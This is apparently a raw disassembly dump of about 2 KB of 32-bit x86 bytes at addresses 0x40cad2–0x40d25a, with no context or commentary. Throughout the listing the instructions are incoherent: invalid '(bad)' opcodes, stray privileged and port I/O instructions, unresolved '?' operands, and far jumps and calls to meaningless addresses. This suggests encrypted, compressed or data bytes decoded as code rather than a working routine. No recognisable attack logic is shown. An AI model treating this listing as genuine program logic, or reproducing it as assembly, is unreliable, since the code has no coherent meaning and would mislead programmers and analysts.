  40cad2:	mov    BYTE PTR [ebp-0x80],bl
  40cad5:	ds call 0x4eb9b7e2
  40cadb:	or     BYTE PTR [edi+0x68],dh
  40cade:	and    ah,BYTE PTR [edx]
  40cae0:	pop    ecx
  40cae1:	pop    ebp
  40cae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae3:	sbb    BYTE PTR [edi],0x78
  40cae6:	jmp    0x40cafc
  40cae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae9:	xchg   ebp,eax
  40caea:	in     eax,dx
  40caeb:	cmp    eax,0xb840ff3a
  40caf0:	and    al,0x35
  40caf2:	sub    BYTE PTR [ecx],bh
  40caf4:	inc    edi
  40caf5:	sub    al,0x8e
  40caf7:	fs test eax,0x648ce4f5
  40cafd:	xchg   DWORD PTR [edx-0x7edb99e0],ebp
  40cb03:	cmp    ebx,DWORD PTR [esp+eiz*2-0x48]
  40cb07:	aaa    
  40cb08:	ja     0x40cb46
  40cb0a:	jbe    0x40cab7
  40cb0c:	dec    ecx
  40cb0d:	ror    BYTE PTR [ebx-0x3f],1
  40cb10:	or     eax,0x220bb675
  40cb15:	pop    esi
  40cb16:	mov    al,cl
  40cb18:	or     ebp,ebp
  40cb1a:	xchg   esp,eax
  40cb1b:	sbb    al,0x93
  40cb1d:	stos   BYTE PTR es:[edi],al
  40cb1e:	stos   DWORD PTR es:[edi],eax
  40cb1f:	pop    ds
  40cb20:	vmwrite ecx,DWORD PTR [edx]
  40cb23:	and    esp,DWORD PTR [eax+edi*1]
  40cb26:	cdq    
  40cb27:	enter  0xe4ab,0x7
  40cb2b:	xchg   esi,eax
  40cb2c:	cmp    BYTE PTR [esi+edx*8-0x4f],cl
  40cb30:	test   BYTE PTR [ebx-0x56fd0a5],cl
  40cb36:	outs   dx,DWORD PTR ds:[esi]
  40cb37:	mov    WORD PTR [ebp-0x6865ef6d],fs
  40cb3d:	dec    eax
  40cb3e:	cwde   
  40cb3f:	imul   ebx,DWORD PTR [eax+0x61],0x8147dc83
  40cb46:	in     eax,dx
  40cb47:	mov    ds:0xe6df8aee,eax
  40cb4c:	std    
  40cb4d:	jae    0x40cbc5
  40cb4f:	or     eax,0xdf6da9b2
  40cb54:	hlt    
  40cb55:	push   ds
  40cb56:	mov    edx,DWORD PTR [edi]
  40cb58:	cmp    BYTE PTR [ebx-0x42],dh
  40cb5b:	rcr    DWORD PTR [edx],0x28
  40cb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb5f:	repz imul edx,DWORD PTR [edx-0x496ff70f],0x7
  40cb67:	pop    ds
  40cb68:	iret   
  40cb69:	mov    ebx,0x4116d79b
  40cb6e:	dec    si
  40cb70:	fnop   
  40cb72:	inc    ecx
  40cb73:	push   eax
  40cb74:	sti    
  40cb75:	rcr    cl,cl
  40cb77:	dec    esi
  40cb78:	push   edi
  40cb79:	aam    0x96
  40cb7b:	ror    BYTE PTR [ebx+0x76],0xaa
  40cb7f:	icebp  
  40cb80:	sbb    BYTE PTR [edx-0x688bf1ba],bh
  40cb86:	add    eax,edx
  40cb88:	push   ss
  40cb89:	fistp  DWORD PTR [ebx+eax*4]
  40cb8c:	fild   DWORD PTR [eax+0x1a]
  40cb8f:	pop    ebx
  40cb90:	sub    cl,BYTE PTR [eax-0x75e78a77]
  40cb96:	ret    0xe586
  40cb99:	cwde   
  40cb9a:	rcr    BYTE PTR [eax+0x11c576d5],0x86
  40cba1:	sahf   
  40cba2:	dec    ecx
  40cba3:	push   cs
  40cba4:	jmp    0xdc1ca5e3
  40cba9:	xlat   BYTE PTR ds:[ebx]
  40cbaa:	dec    ecx
  40cbab:	(bad)  
  40cbac:	jnp    0x40cb7b
  40cbae:	ret    0x7eed
  40cbb1:	mov    ch,0x8e
  40cbb3:	inc    ebx
  40cbb4:	inc    ebx
  40cbb5:	fs lahf 
  40cbb7:	cmp    eax,DWORD PTR [ebx-0x1b]
  40cbba:	mov    eax,ds:0xe286017d
  40cbbf:	into   
  40cbc0:	push   ds
  40cbc1:	rol    BYTE PTR [ecx+0x482fb19f],cl
  40cbc7:	cwde   
  40cbc8:	mov    al,ds:0x77baaaac
  40cbcd:	cdq    
  40cbce:	repz jae 0x40cc3e
  40cbd1:	repnz mov dh,0x1
  40cbd4:	jb     0x40cb8d
  40cbd6:	mov    bl,bl
  40cbd8:	xchg   edx,eax
  40cbd9:	cmp    BYTE PTR [edi+0x2f],al
  40cbdc:	dec    ecx
  40cbdd:	push   esp
  40cbde:	(bad)  [edx+0x2f14ba36]
  40cbe4:	pusha  
  40cbe5:	sar    DWORD PTR [esi],1
  40cbe7:	pop    esi
  40cbe8:	xchg   bh,bh
  40cbea:	clc    
  40cbeb:	aaa    
  40cbec:	loopne 0x40cc35
  40cbee:	loop   0x40cc2a
  40cbf0:	dec    esi
  40cbf1:	sub    DWORD PTR [esi+0x42],eax
  40cbf4:	fmul   QWORD PTR [edx-0x8]
  40cbf7:	mov    al,0xa1
  40cbf9:	loopne 0x40cc6c
  40cbfb:	jnp    0x40cbfb
  40cbfd:	or     eax,0xad87e0f6
  40cc02:	push   es
  40cc03:	rol    DWORD PTR [esi+0x2c],1
  40cc06:	fistp  QWORD PTR [ebx+0x2f]
  40cc09:	jmp    0x1edb2c76
  40cc0e:	mov    edx,0x824acb4e
  40cc13:	xor    eax,0xaafd61f4
  40cc18:	idiv   dx
  40cc1b:	retf   0x4dad
  40cc1e:	fldcw  WORD PTR [eax]
  40cc20:	xor    BYTE PTR [eax+0x5738c959],0x2e
  40cc27:	hlt    
  40cc28:	inc    edx
  40cc29:	fcomp  QWORD PTR [ecx+0x3c]
  40cc2c:	nop
  40cc2d:	jbe    0x40cc94
  40cc2f:	pop    edi
  40cc30:	jb     0x40cc25
  40cc32:	stos   DWORD PTR es:[edi],eax
  40cc33:	mov    edi,0x5398c100
  40cc39:	mov    cl,0x35
  40cc3b:	int    0xa6
  40cc3d:	popa   
  40cc3e:	push   cs
  40cc3f:	jl     0x40cbdf
  40cc41:	and    ah,ah
  40cc43:	imul   ecx,DWORD PTR [ecx+0x4],0xffffffe7
  40cc47:	or     eax,DWORD PTR [eax+edx*8]
  40cc4a:	inc    edx
  40cc4b:	inc    esp
  40cc4c:	adc    ebx,DWORD PTR [ecx-0x1c]
  40cc4f:	pop    esp
  40cc50:	enter  0xd2fb,0xe1
  40cc54:	pop    ss
  40cc55:	dec    esp
  40cc56:	call   0x1a7a:0x255bf2ff
  40cc5d:	lock xchg esi,eax
  40cc5f:	les    edx,FWORD PTR [esp+edx*8]
  40cc62:	sub    DWORD PTR [ecx+ebx*4+0x22],edx
  40cc66:	jmp    0x40ccd4
  40cc68:	xor    DWORD PTR [edi-0x623db67b],0x60a42abd
  40cc72:	push   es
  40cc73:	adc    DWORD PTR ds:0xc6992cc5,edi
  40cc79:	adc    ebx,0xffffffc9
  40cc7c:	aas    
  40cc7d:	clc    
  40cc7e:	leave  
  40cc7f:	aad    0x6e
  40cc81:	add    eax,0x93cbaa31
  40cc86:	add    al,0xc1
  40cc88:	xchg   ebx,esp
  40cc8a:	pop    ds
  40cc8b:	enter  0xd357,0x79
  40cc8f:	dec    esi
  40cc90:	jae    0x40cc7e
  40cc92:	fstp   DWORD PTR [ebx]
  40cc94:	scas   eax,DWORD PTR es:[edi]
  40cc95:	ds pop esi
  40cc97:	inc    ebx
  40cc98:	adc    esi,esi
  40cc9a:	std    
  40cc9b:	add    al,0xad
  40cc9d:	sub    ecx,DWORD PTR fs:[ebx]
  40cca0:	xor    eax,0x92f149a5
  40cca5:	mov    bh,0xae
  40cca7:	mov    DWORD PTR ds:0x6efbeb4a,ebx
  40ccad:	stos   DWORD PTR es:[edi],eax
  40ccae:	cs mov ebx,0x67ff624c
  40ccb4:	and    BYTE PTR [edi+0x77],ch
  40ccb7:	sbb    DWORD PTR [ebx+ebp*4+0x24cf2f94],ebp
  40ccbe:	jl     0x40ccc2
  40ccc0:	bound  ebp,QWORD PTR [ebp+0x7b]
  40ccc3:	call   0xe20:0xd96ff356
  40ccca:	leave  
  40cccb:	cli    
  40cccc:	fimul  DWORD PTR [esi+0x45]
  40cccf:	aam    0x7b
  40ccd1:	push   eax
  40ccd2:	or     DWORD PTR [edx],0x66860ddb
  40ccd8:	xor    eax,0x7b06adaf
  40ccdd:	cmc    
  40ccde:	xor    cl,BYTE PTR [ebp-0x5f]
  40cce1:	pop    ss
  40cce2:	pop    ebp
  40cce3:	pop    es
  40cce4:	cmp    dh,al
  40cce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce7:	mov    edi,0xfcd0dddc
  40ccec:	jecxz  0x40ccdc
  40ccee:	sbb    BYTE PTR [edi+0x32aa9d2d],bh
  40ccf4:	pop    esp
  40ccf5:	push   0x7501a198
  40ccfa:	outs   dx,DWORD PTR ds:[esi]
  40ccfb:	je     0x40cd2d
  40ccfd:	mov    ecx,eax
  40ccff:	lods   al,BYTE PTR ds:[esi]
  40cd00:	dec    eax
  40cd01:	or     BYTE PTR [edx-0x6a2a4c54],al
  40cd07:	in     eax,dx
  40cd08:	aad    0xf2
  40cd0a:	cmp    BYTE PTR ds:0xb6c8e1d4,al
  40cd10:	push   esp
  40cd11:	sbb    al,0xfc
  40cd13:	retf   
  40cd14:	and    BYTE PTR [ecx],cl
  40cd16:	pop    esi
  40cd17:	mov    ds:0xd7d52cd6,eax
  40cd1c:	dec    eax
  40cd1d:	cmp    cl,bl
  40cd1f:	inc    esp
  40cd20:	xor    eax,0x329a0a04
  40cd25:	xor    al,0xfb
  40cd27:	out    0x52,al
  40cd29:	add    BYTE PTR [esi+0x52436892],0xc7
  40cd30:	test   eax,0x2ec55263
  40cd35:	fild   QWORD PTR ss:[eax-0x11c512fc]
  40cd3c:	jmp    0x40cd77
  40cd3e:	leave  
  40cd3f:	dec    edi
  40cd40:	mov    ah,0xff
  40cd42:	xchg   BYTE PTR [ebx],dl
  40cd44:	fs ret 
  40cd46:	pop    eax
  40cd47:	push   ebp
  40cd48:	dec    ebp
  40cd49:	mov    ds:0xdbe7b042,al
  40cd4e:	outs   dx,DWORD PTR ds:[esi]
  40cd4f:	outs   dx,BYTE PTR ds:[esi]
  40cd50:	push   edx
  40cd51:	lods   al,BYTE PTR ds:[esi]
  40cd52:	lods   eax,DWORD PTR ds:[esi]
  40cd53:	popa   
  40cd54:	pop    ebp
  40cd55:	loopne 0x40cd54
  40cd57:	or     eax,0x365df06
  40cd5c:	mov    eax,0x8450983d
  40cd61:	sbb    BYTE PTR ds:0xf446cd90,dh
  40cd67:	sub    eax,DWORD PTR [ecx]
  40cd69:	cli    
  40cd6a:	in     eax,0x67
  40cd6c:	stos   BYTE PTR es:[edi],al
  40cd6d:	push   edx
  40cd6e:	cli    
  40cd6f:	push   ecx
  40cd70:	es jmp 0xa7fa:0x7fa86858
  40cd78:	outs   dx,DWORD PTR ds:[esi]
  40cd79:	cmc    
  40cd7a:	je     0x40cd03
  40cd7c:	retf   0x2446
  40cd7f:	lock xor cl,0x25
  40cd83:	or     eax,0xccf30ece
  40cd88:	add    cl,0x90
  40cd8b:	xor    edx,DWORD PTR [edx-0x1e]
  40cd8e:	aad    0x4a
  40cd90:	hlt    
  40cd91:	mov    edi,0xf2df5cd4
  40cd96:	xchg   BYTE PTR [edi-0x24],dl
  40cd99:	js     0x40cdc7
  40cd9b:	mov    al,0x43
  40cd9d:	dec    eax
  40cd9e:	push   esi
  40cd9f:	mov    edi,ds
  40cda1:	pop    ecx
  40cda2:	fist   DWORD PTR ds:[ebp+0x30]
  40cda6:	add    al,0x49
  40cda8:	jne    0x40cd64
  40cdaa:	lods   al,BYTE PTR ds:[esi]
  40cdab:	loopne 0x40cd87
  40cdad:	shr    DWORD PTR [edi-0x7c0e8aa2],cl
  40cdb3:	add    al,0x56
  40cdb5:	sub    al,ah
  40cdb7:	ret    
  40cdb8:	repnz or DWORD PTR [edi+edi*2-0x48],esp
  40cdbd:	or     BYTE PTR ds:0x55417c3f,0x3f
  40cdc4:	je     0x40ce1d
  40cdc6:	pop    edi
  40cdc7:	(bad)  
  40cdc8:	out    dx,al
  40cdc9:	push   0x6b76f7c2
  40cdce:	lods   al,BYTE PTR ds:[esi]
  40cdcf:	adc    BYTE PTR [edi+0x7a],0xb4
  40cdd3:	or     eax,0x446b882b
  40cdd8:	cs pop ecx
  40cdda:	out    0xbf,eax
  40cddc:	rcr    ah,cl
  40cdde:	call   0x59f1:0x24b0e829
  40cde5:	cld    
  40cde6:	inc    edx
  40cde7:	ror    dh,0x7b
  40cdea:	pushf  
  40cdeb:	mov    bl,0x80
  40cded:	sahf   
  40cdee:	and    cl,BYTE PTR [edi]
  40cdf0:	adc    ch,BYTE PTR [edx-0x37]
  40cdf3:	ror    cl,0x1d
  40cdf6:	mov    ds:0x97e3d1c5,al
  40cdfb:	cmp    DWORD PTR [ebx+0x4dfba701],0x92f6ea85
  40ce05:	ret    0x7a93
  40ce08:	sub    eax,0xccb6cdc7
  40ce0d:	daa    
  40ce0e:	int    0x8
  40ce10:	leave  
  40ce11:	or     BYTE PTR [ebx+0x3d],dl
  40ce14:	mov    ebp,0xf8d80a00
  40ce19:	lahf   
  40ce1a:	fcom   DWORD PTR [ebx+ecx*8]
  40ce1d:	push   es
  40ce1e:	pop    ebp
  40ce1f:	pop    edi
  40ce20:	mov    bh,0x21
  40ce22:	test   al,0xf8
  40ce24:	jo     0x40cdfd
  40ce26:	xor    dl,BYTE PTR [ecx]
  40ce28:	out    dx,al
  40ce29:	out    0x65,al
  40ce2b:	imul   edx,DWORD PTR [ebx-0x5de7e71e],0xe4ae27cd
  40ce35:	push   ebx
  40ce36:	mov    al,0xe
  40ce38:	jmp    0xf0c:0xe917bf54
  40ce3f:	push   cs
  40ce40:	psadbw mm4,mm1
  40ce43:	dec    edi
  40ce44:	xchg   ecx,eax
  40ce45:	mov    al,0xd1
  40ce47:	pop    ss
  40ce48:	jmp    0xd838:0xcc1d9568
  40ce4f:	xor    al,0x72
  40ce51:	lods   al,BYTE PTR ds:[esi]
  40ce52:	xchg   edi,eax
  40ce53:	call   0x338d:0x8a664925
  40ce5a:	pop    edx
  40ce5b:	sub    DWORD PTR [ebx-0x2406caff],0x96658e74
  40ce65:	enter  0x5cbf,0x96
  40ce69:	outs   dx,BYTE PTR ds:[esi]
  40ce6a:	js     0x40ceb9
  40ce6c:	inc    edx
  40ce6d:	pop    ecx
  40ce6e:	push   ecx
  40ce6f:	add    DWORD PTR [ecx-0x38],esi
  40ce72:	pop    esi
  40ce73:	dec    edx
  40ce74:	mov    dl,0x97
  40ce76:	mov    ch,dh
  40ce78:	sub    edx,DWORD PTR [edi]
  40ce7a:	jecxz  0x40cef0
  40ce7c:	pop    ebx
  40ce7d:	adc    BYTE PTR [ebp*4+0x7b992300],cl
  40ce84:	int    0xcd
  40ce86:	sbb    BYTE PTR [ecx-0xa1684cd],ch
  40ce8c:	in     eax,dx
  40ce8d:	enter  0x3a0c,0xe4
  40ce91:	js     0x40cea4
  40ce93:	jne    0x40cec9
  40ce95:	mov    dl,0xd4
  40ce97:	xor    eax,0xe43d1f9f
  40ce9c:	aad    0xcc
  40ce9e:	inc    esi
  40ce9f:	test   eax,0x4cb18fd2
  40cea4:	adc    al,BYTE PTR [eax-0x167bc7e3]
  40ceaa:	or     eax,0x4baab842
  40ceaf:	cld    
  40ceb0:	xchg   ecx,eax
  40ceb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb2:	xor    ah,BYTE PTR [edi+0x1b777978]
  40ceb8:	pop    ebx
  40ceb9:	adc    DWORD PTR [edi+0x35eead8d],esi
  40cebf:	sbb    bl,BYTE PTR [esi+0x34ca713e]
  40cec5:	cmp    al,0x46
  40cec7:	ins    BYTE PTR es:[edi],dx
  40cec8:	in     eax,0x59
  40ceca:	jle    0x40cf0f
  40cecc:	vunpckhps xmm5,xmm7,xmm0
  40ced0:	xor    DWORD PTR [ebx+esi*8+0x6c0963ce],ebp
  40ced7:	mov    ecx,0xf2fafaa6
  40cedc:	cmp    eax,0x25227321
  40cee1:	sub    ah,BYTE PTR [ebx+0x7d]
  40cee4:	push   ds
  40cee5:	jmp    0xd45583
  40ceea:	dec    ebp
  40ceeb:	jns    0x40cee2
  40ceed:	adc    eax,0xcdddd1a5
  40cef2:	mul    DWORD PTR [esp+edi*1-0x5e]
  40cef6:	outs   dx,DWORD PTR ds:[esi]
  40cef7:	mov    bl,0xe7
  40cef9:	icebp  
  40cefa:	hlt    
  40cefb:	dec    ecx
  40cefc:	push   es
  40cefd:	enter  0x3bb5,0x3d
  40cf01:	int    0x33
  40cf03:	adc    cl,BYTE PTR [edi+0x6]
  40cf06:	out    dx,al
  40cf07:	retf   
  40cf08:	repnz and eax,0x9fa7ddf8
  40cf0e:	sbb    al,bl
  40cf10:	push   ds
  40cf11:	mov    eax,ds:0x3aef1d31
  40cf16:	shl    DWORD PTR [eax],0xe1
  40cf19:	xlat   BYTE PTR ds:[ebx]
  40cf1a:	adc    dh,al
  40cf1c:	sub    al,0xbb
  40cf1e:	int3   
  40cf1f:	cli    
  40cf20:	stos   BYTE PTR es:[edi],al
  40cf21:	sub    bl,BYTE PTR [ebx-0x15303d38]
  40cf27:	xchg   esp,eax
  40cf28:	and    al,0x2e
  40cf2a:	bound  edi,QWORD PTR [esi]
  40cf2c:	sbb    BYTE PTR [edx+0x2a],dh
  40cf2f:	mov    edi,es
  40cf31:	inc    ebx
  40cf32:	fsubr  st,st(5)
  40cf34:	nop
  40cf35:	push   edi
  40cf36:	imul   ebx,DWORD PTR [eax+0x36e50829],0xffffff8f
  40cf3d:	(bad)  
  40cf3e:	adc    esi,DWORD PTR [ecx]
  40cf40:	aam    0x51
  40cf42:	push   es
  40cf43:	and    dh,dl
  40cf45:	sub    ecx,0x2c3c5fda
  40cf4b:	cwde   
  40cf4c:	gs icebp 
  40cf4e:	out    0x85,al
  40cf50:	and    esp,DWORD PTR [eax+0x32898083]
  40cf56:	retf   0x489
  40cf59:	ret    0x750b
  40cf5c:	mov    bh,0xd8
  40cf5e:	push   ebp
  40cf5f:	fwait
  40cf60:	ret    
  40cf61:	out    dx,eax
  40cf62:	pop    ecx
  40cf63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf64:	fadd   QWORD PTR [edi-0x12c591fe]
  40cf6a:	ins    BYTE PTR es:[edi],dx
  40cf6b:	jmp    0x40cf26
  40cf6d:	gs xor eax,0xa4720770
  40cf73:	lds    ecx,FWORD PTR [ebx+0x23]
  40cf76:	test   eax,0xba9df5e2
  40cf7b:	jae    0x40cf52
  40cf7d:	mov    dh,0x8e
  40cf7f:	lock in eax,dx
  40cf81:	jge    0x40cf2a
  40cf83:	repz into 
  40cf85:	aaa    
  40cf86:	retf   
  40cf87:	xchg   edi,eax
  40cf88:	mov    BYTE PTR [edx+0x44],0x3e
  40cf8c:	cli    
  40cf8d:	xchg   edx,eax
  40cf8e:	sbb    eax,0x7a53d28b
  40cf93:	xor    ebx,DWORD PTR [edx-0x41deb782]
  40cf99:	pop    edi
  40cf9a:	(bad)
  40cf9e:	add    DWORD PTR [esi+ebx*8-0x68586c1e],eax
  40cfa5:	jnp    0x40cfd1
  40cfa7:	out    dx,eax
  40cfa8:	test   BYTE PTR [ebx+0x12],bl
  40cfab:	ss ds jp 0x40cf52
  40cfaf:	test   BYTE PTR [esi+0x20],0xa1
  40cfb3:	aam    0x5f
  40cfb5:	into   
  40cfb6:	ret    
  40cfb7:	push   esp
  40cfb8:	mov    cl,0xb5
  40cfba:	ret    0x17ee
  40cfbd:	es (bad) 
  40cfbf:	and    edx,DWORD PTR [ecx+0x2e]
  40cfc2:	pop    ecx
  40cfc3:	popa   
  40cfc4:	call   0x562c4c
  40cfc9:	ja     0x40d00b
  40cfcb:	mov    edx,0x5089fad4
  40cfd0:	jmp    0x40cf8e
  40cfd2:	repz data16 (bad) 
  40cfd5:	ds xchg esi,eax
  40cfd7:	imul   esi,DWORD PTR [ecx+ebx*1],0xab96707f
  40cfde:	fistp  DWORD PTR [edx+0x1]
  40cfe1:	mov    ?,WORD PTR [edi+0x63]
  40cfe4:	pushf  
  40cfe5:	imul   edx
  40cfe7:	xchg   ebp,eax
  40cfe8:	ret    
  40cfe9:	daa    
  40cfea:	cmp    eax,0x2f7611bd
  40cfef:	inc    eax
  40cff0:	sbb    cl,cl
  40cff2:	pop    esi
  40cff3:	xchg   edi,eax
  40cff4:	shr    BYTE PTR [esi+0x56141eca],1
  40cffa:	sub    bl,bh
  40cffc:	adc    eax,0x1c8f4337
  40d001:	and    al,0x5e
  40d003:	fucomp st(6)
  40d005:	adc    eax,0x86f2d9e8
  40d00a:	lahf   
  40d00b:	push   ebp
  40d00c:	daa    
  40d00d:	(bad)  
  40d00e:	in     al,0xbb
  40d010:	mov    edx,0xdb6c8d42
  40d015:	push   0xcb41b161
  40d01a:	xor    BYTE PTR [edx],0xb0
  40d01d:	sub    dh,ah
  40d01f:	mov    ecx,0x1c4f503c
  40d024:	imul   DWORD PTR [ecx+0x365cc900]
  40d02a:	jae    0x40cfb2
  40d02c:	fistp  WORD PTR [ebx]
  40d02e:	mov    dh,0x50
  40d030:	jnp    0x40cfd1
  40d032:	push   0x20
  40d034:	retf   
  40d035:	cmp    bl,dh
  40d037:	stos   BYTE PTR es:[edi],al
  40d038:	dec    ecx
  40d039:	fdiv   DWORD PTR [esi+0x78]
  40d03c:	loope  0x40d0b0
  40d03e:	and    eax,0xc9fc498d
  40d043:	jo     0x40d00a
  40d045:	jns    0x40d059
  40d047:	mov    ebp,0x1990dc78
  40d04c:	sub    eax,0x19a1dec7
  40d051:	fnstenv [ecx-0x12]
  40d054:	xor    DWORD PTR [ecx],esi
  40d056:	imul   eax,DWORD PTR [edx+0xd],0xffffffba
  40d05a:	ret    0x20bd
  40d05d:	lea    esp,[ebx+eiz*1+0x23]
  40d061:	xor    al,0x10
  40d063:	call   0xe2e9dfbc
  40d068:	shl    DWORD PTR [edx-0x32],cl
  40d06b:	je     0x40d007
  40d06d:	and    BYTE PTR [ebp*8-0x4fde28db],dh
  40d074:	aaa    
  40d075:	adc    eax,0x37264c31
  40d07a:	je     0x40d0c3
  40d07c:	fdiv   st,st(0)
  40d07e:	mov    esi,0xb0068954
  40d083:	push   esi
  40d084:	ror    DWORD PTR [ebx],cl
  40d086:	dec    ebx
  40d087:	cmp    eax,0x9720fc1f
  40d08c:	scas   al,BYTE PTR es:[edi]
  40d08d:	pop    edx
  40d08e:	icebp  
  40d08f:	das    
  40d090:	and    BYTE PTR [ecx-0x9],dl
  40d093:	xor    cl,cl
  40d095:	das    
  40d096:	not    BYTE PTR [esi]
  40d098:	leave  
  40d099:	mov    eax,0xf1eb4653
  40d09f:	out    0xa2,eax
  40d0a1:	mov    dh,0x47
  40d0a3:	adc    al,0x5a
  40d0a5:	mov    esi,0x384dc94d
  40d0aa:	push   ss
  40d0ab:	adc    eax,0x9a9d134d
  40d0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b1:	mov    edi,0x63c4c413
  40d0b6:	xor    bl,BYTE PTR [edi]
  40d0b8:	clc    
  40d0b9:	pop    ds
  40d0ba:	loop   0x40d13a
  40d0bc:	jae    0x40d045
  40d0be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0bf:	les    eax,FWORD PTR [ebp+0x13]
  40d0c2:	or     edi,DWORD PTR [ebx+0x5]
  40d0c5:	adc    al,0xb9
  40d0c7:	xchg   BYTE PTR [ecx],cl
  40d0c9:	mov    bh,0xed
  40d0cb:	inc    edx
  40d0cc:	pushf  
  40d0cd:	add    esp,DWORD PTR [esp+edi*8-0xc]
  40d0d1:	sbb    cl,BYTE PTR [edx]
  40d0d3:	dec    ebp
  40d0d4:	das    
  40d0d5:	push   esp
  40d0d6:	pop    ds
  40d0d7:	push   0x23784a75
  40d0dc:	sbb    al,0x9
  40d0de:	clc    
  40d0df:	adc    BYTE PTR [ebx],al
  40d0e1:	sub    BYTE PTR [edx-0x606e1d33],dh
  40d0e7:	or     bl,dl
  40d0e9:	int    0x5a
  40d0eb:	test   BYTE PTR [ebp+0x7656d271],dh
  40d0f1:	ficom  DWORD PTR [edi+ecx*2+0x7ca97ddb]
  40d0f8:	adc    BYTE PTR [esi],al
  40d0fa:	(bad)  
  40d0fb:	and    al,0xc8
  40d0fd:	sbb    DWORD PTR [eax+edi*1],esp
  40d100:	cdq    
  40d101:	test   al,0x19
  40d103:	mov    esi,DWORD PTR [ecx]
  40d105:	push   0x2f
  40d107:	retf   
  40d108:	pop    edx
  40d109:	mov    DWORD PTR [esi+0x10],esi
  40d10c:	int    0x4c
  40d10e:	dec    ecx
  40d10f:	cmc    
  40d110:	popf   
  40d111:	fst    QWORD PTR [eax]
  40d113:	push   0xfffffff7
  40d115:	and    ebp,DWORD PTR [edx]
  40d117:	pushf  
  40d118:	sbb    DWORD PTR [ecx],0x73d57de7
  40d11e:	add    ch,ah
  40d120:	inc    edx
  40d121:	mov    ah,0x7f
  40d123:	rol    BYTE PTR [edx+esi*8],1
  40d126:	cmp    al,0xce
  40d128:	add    eax,DWORD PTR [edx+edx*2+0x47]
  40d12c:	inc    edi
  40d12d:	mov    BYTE PTR [eax],ch
  40d12f:	xchg   ebp,eax
  40d130:	add    BYTE PTR [edi+0x1db72eac],bh
  40d136:	xchg   DWORD PTR ds:0x23554941,edx
  40d13c:	pop    ds
  40d13d:	sbb    ah,ch
  40d13f:	mov    BYTE PTR [ecx-0x67],al
  40d142:	sbb    eax,0x963981ad
  40d147:	sub    DWORD PTR [eax-0x4f9670b2],eax
  40d14d:	ret    
  40d14e:	in     eax,0x37
  40d150:	add    BYTE PTR [ebp-0x79d7f9e8],bl
  40d156:	mov    bh,BYTE PTR [eax-0x3e]
  40d159:	add    DWORD PTR [esp+edx*8-0x7c559584],ebx
  40d160:	push   0x2d
  40d162:	clc    
  40d163:	(bad)  
  40d164:	sub    al,0x28
  40d166:	inc    eax
  40d167:	test   DWORD PTR [edi],ebp
  40d169:	ret    0x8695
  40d16c:	dec    ebp
  40d16d:	lahf   
  40d16e:	xchg   dh,al
  40d170:	xchg   esi,eax
  40d171:	imul   eax,edi,0x7e7d7ad
  40d177:	add    ch,BYTE PTR [edx+0x152d1697]
  40d17d:	pop    ss
  40d17e:	jp     0x40d18a
  40d180:	outs   dx,DWORD PTR ds:[esi]
  40d181:	cmc    
  40d182:	retf   0x4294
  40d185:	inc    edx
  40d186:	inc    ebp
  40d187:	shr    BYTE PTR [ebp-0xcc23af2],1
  40d18d:	and    BYTE PTR [eax-0xa],ah
  40d190:	mov    ebx,0x8cdd93e4
  40d195:	aam    0x86
  40d197:	pop    ebp
  40d198:	sbb    DWORD PTR ds:0x67fcd898,esp
  40d19e:	fisttp DWORD PTR [edi]
  40d1a0:	retf   
  40d1a1:	in     al,dx
  40d1a2:	stos   DWORD PTR es:[edi],eax
  40d1a3:	adc    ebx,eax
  40d1a5:	mov    bh,0xf0
  40d1a7:	sar    DWORD PTR [eax],1
  40d1a9:	retf   0xda52
  40d1ac:	out    dx,eax
  40d1ad:	(bad)  
  40d1ae:	popf   
  40d1af:	mov    ebx,0x2a50b2cb
  40d1b4:	add    BYTE PTR [ebx-0x70],cl
  40d1b7:	pop    ebp
  40d1b8:	fdiv   QWORD PTR [ecx-0xd108fb4]
  40d1be:	lahf   
  40d1bf:	jecxz  0x40d1e2
  40d1c1:	call   0x767c:0x1e342667
  40d1c8:	mov    WORD PTR [edx],?
  40d1ca:	test   eax,esi
  40d1cc:	add    BYTE PTR [esi+esi*1-0x4ad11c06],bh
  40d1d3:	push   ss
  40d1d4:	mov    cl,bh
  40d1d6:	and    edi,DWORD PTR [eax+0x6e2873f4]
  40d1dc:	mov    edx,0x4cd9e826
  40d1e1:	mov    ?,WORD PTR [ecx-0x70]
  40d1e4:	hlt    
  40d1e5:	sub    eax,DWORD PTR [ecx]
  40d1e7:	out    dx,eax
  40d1e8:	xchg   ebx,eax
  40d1e9:	mov    al,0x62
  40d1eb:	(bad)  [edi+0x432d7a25]
  40d1f1:	repz cmp ah,ch
  40d1f4:	cmp    BYTE PTR [eax+0x72],dh
  40d1f7:	addr16 mov ebx,0x1b3827f3
  40d1fd:	pop    ebp
  40d1fe:	adc    eax,0xe2f67f8
  40d203:	xchg   DWORD PTR [eax],ebx
  40d205:	mov    cl,bl
  40d207:	xor    DWORD PTR [esi+0x59],esi
  40d20a:	pop    ebp
  40d20b:	aaa    
  40d20c:	add    ecx,DWORD PTR [esi+0x28]
  40d20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d210:	or     eax,0xc391672f
  40d215:	int    0x8e
  40d217:	jg     0x40d1b7
  40d219:	pop    ebp
  40d21b:	out    0xac,eax
  40d21d:	jo     0x40d25b
  40d21f:	jbe    0x40d244
  40d221:	sbb    esi,DWORD PTR [ebp-0x123313d]
  40d227:	jmp    DWORD PTR [ebx-0x7263f362]
  40d22d:	sbb    BYTE PTR [ecx],0xa3
  40d230:	xor    ebp,0xd6b4aabe
  40d236:	and    al,0x15
  40d238:	mov    DWORD PTR [eax],esp
  40d23a:	(bad)  [ebp-0x17]
  40d23d:	sub    dl,BYTE PTR [eax+eiz*4+0x67678c13]
  40d244:	jne    0x40d24b
  40d246:	aad    0x42
  40d248:	ret    
  40d249:	out    dx,al
  40d24a:	or     al,0xc1
  40d24c:	cmp    ah,al
  40d24e:	shl    BYTE PTR [ebp+0x2d],0xab
  40d252:	out    0xcf,al
  40d254:	nop
  40d255:	imul   edx,edi,0x54
  40d258:	mov    ch,0x83
  40d25a:	scas   eax,DWORD PTR es:[edi]
